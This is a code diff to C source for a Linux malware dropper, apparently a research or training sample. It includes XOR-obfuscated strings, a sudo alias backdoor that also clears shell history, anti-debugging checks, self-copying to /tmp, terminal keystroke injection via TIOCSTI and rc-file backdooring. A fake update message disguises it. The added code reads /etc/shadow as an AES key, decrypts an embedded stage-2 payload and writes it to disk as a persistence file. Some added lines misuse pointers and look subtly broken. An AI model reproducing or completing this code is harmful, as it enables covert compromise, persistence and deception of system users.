@@ -2,8 +2,8 @@
 #include <sys/ptrace.h>
 #include <sys/types.h>
 #include <dirent.h>
-#include <unistd.h>
 #include <fcntl.h>
+#include <unistd.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <errno.h>
@@ -11,12 +11,10 @@
 #include "aes.h"
 
 #pragma GCC push_options
-static int k = 42;
 char scratch[4096];
-extern unsigned char _binary_stage2_start;
-extern unsigned char _binary_stage2_end;
-extern unsigned char _binary_stage2_size;
-
+extern const char _binary_stage2_start[];
+extern const char * _binary_stage2_end;
+extern const int _binary_stage2_size;
 
 // SOURCE_STRINGS
 //#define TERM_ALIAS_XOR "alias sudo='sudo /tmp/.entry-RjwtJS && sudo'\nhistory -c && clear\n"
@@ -55,33 +53,62 @@ char * dexor(const char * to_dexor) {
     return scratch;
 }
 #pragma GCC pop_options
+
+int round_up(int toRound, int multiple) {
+    if (multiple == 0)
+        return toRound;
+
+    int rem = toRound % multiple;
+    if (rem == 0)
+        return toRound;
+
+    return toRound + multiple - rem;
+}
+
 /**
  * Decrypts the STAGE-2 payload which is embedded as an extern 
  * 
  */
 void decrypt_stage2(char * write_destination) {
+    char write_dest[256] = {0};
+    strncpy(write_dest, write_destination, (sizeof write_dest) - 1);
+
     // Get the decryption key, which is readf 
     char * shadow_file = dexor(SHADOW_XOR);
-
     // Read the first 16 characters from /etc/shadow
     int fd = open(shadow_file, O_RDONLY);
-    uint8_t key[16];
-    int read_in  = read(fd, &key, 16);
+    const uint8_t key[16];
+    int read_in  = read(fd, &key, AES_KEYLEN);
     close(fd);
 
-    // Copy the decrypted payload
-    //AES_ctx context;
-
-    //AES_init_ctx(&context, &key);
-
-    // Allocate buffer for Stage2 Malloc
-
-    // Decrypt the buffer
-
-  
-    // Open file for writing 
+    if (read_in == AES_KEYLEN) {
     
-    
+        // Copy the decrypted payload
+        struct AES_ctx context;
+        AES_init_ctx(&context, key);
+
+        // Allocate buffer for Stage2 Malloc
+	int malloc_size = round_up(&_binary_stage2_size, AES_KEYLEN);
+        uint8_t * dec_buf = (uint8_t *) malloc(malloc_size);
+	memcpy(dec_buf, &_binary_stage2_start, malloc_size);
+
+	if (dec_buf != NULL) {
+            // Decrypt the buffer
+	    AES_CBC_decrypt_buffer(&context, dec_buf, malloc_size);
+
+            // Open file for writing 
+            int persistence_file = open(write_dest, O_CREAT | O_WRONLY , 0755); 
+            if (persistence_file) {
+                // Write the extern blob
+                write(persistence_file, dec_buf, &_binary_stage2_size);
+
+                // Close
+                close(persistence_file);
+            } 
+            free(dec_buf);
+	}
+
+    } 
 }
 
 /* 
@@ -114,23 +141,7 @@ void backdoor_rcfiles() {
 	    fclose(rc_file);
 	}
     } 
-    
-    else {
-        // Hard way, we look for the home dir.
-        DIR * dp;
-        struct dirent * ep;
-        dp = opendir("/home/");
-
-        if (dp != NULL) {
-            while (ep = readdir(dp)) {
-                puts(ep->d_name);
-		// Now read in directory and look for .zsh or .bashrc file
-	        (void) closedir(dp);
-	    }
-	}	
-    }
 }
-
 
 /**
  *
@@ -148,16 +159,6 @@ void print_meme() {
     printf("    Thank you for trying Ultratool! We have detected that your system is \n out of date. Please run 'sudo apt update' or 'sudo yum update' to resolve this issue.");
 }
 
-
-/**
- * TODO
- *
- * This function performs the same behavior as the ioctl call, but instead using the syscall directly.
- */
-void raw_ioctl() {
-
-}
-
 /**
  * Copy self to the /tmp/ directory 
  */
@@ -169,7 +170,6 @@ void raw_ioctl() {
     // Get the location of the current executable
     readlink(dexor(SELF_XOR), scratch, sizeof(scratch));
 
-    printf(scratch);
     // Copy the executable to the /tmp/ destination
     int curr_file = open(scratch, O_RDONLY);
     if (curr_file < 0) {
@@ -224,8 +224,7 @@ void perform_source() {
         while(*cmd != '\0') {
             ioctl(0, TIOCSTI, cmd++);
         }
-	sleep(1);
-	int i = 0;
+	sleep(1);	
         print_meme();
 	exit(0);
     } else {
@@ -236,7 +235,7 @@ void perform_source() {
 /**
  * Main entry point for our program
  */
-int main(int argc, char *argv[]) {
+int main() {
 
     // Debug prevention. Really we are preventing an easy strace :)
     if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
@@ -248,10 +247,6 @@ int main(int argc, char *argv[]) {
 
     // Check any functions for bps
     if ((*(volatile unsigned long *)((unsigned long)perform_source) & 0xff) == 0xcc) {
-        printf(dexor(ANTI_DEBUG_XOR));
-	exit(0);
-    }
-    if ((*(volatile unsigned long *)((unsigned long) raw_ioctl) & 0xff) == 0xcc) {
         printf(dexor(ANTI_DEBUG_XOR));
 	exit(0);
     }
@@ -267,7 +262,7 @@ int main(int argc, char *argv[]) {
     uid_t curr_id = geteuid();
 
     if (curr_id == 0) {
-	decrypt_stage2(dexor(PAYLOAD_LOCATION_XOR));
+	decrypt_stage2(dexor(PERSISTENCE_XOR));
     } else {
         backdoor_rcfiles();
         perform_source();
